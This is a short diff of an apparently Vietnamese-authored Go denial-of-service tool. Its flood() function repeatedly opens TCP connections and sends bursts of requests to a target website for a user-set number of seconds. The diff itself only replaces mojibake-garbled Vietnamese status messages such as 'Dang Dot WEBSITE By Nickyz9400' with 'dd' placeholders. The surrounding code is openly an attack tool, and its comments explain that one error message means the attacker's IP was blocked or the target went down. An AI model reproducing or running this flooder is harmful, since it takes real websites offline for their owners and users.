@@ -197,7 +197,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Ðang Ð?t WEBSITE By Nickyz9400!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("dd WEBSITE By Nickyz9400!!!") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -272,13 +272,13 @@ func main() {
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
 	}
-	fmt.Printf("\nB?m [Enter] Ð? Ti?p T?c")
+	fmt.Printf("\ndd [Enter] dd")
 	_, err = input.ReadString('\n')
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
-	fmt.Println("Tool l? s? t?t sau  " + os.Args[4] + " seconds.")
+	fmt.Println("Tool dd sau  " + os.Args[4] + " seconds.")
 	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
 	//Keep the threads continue
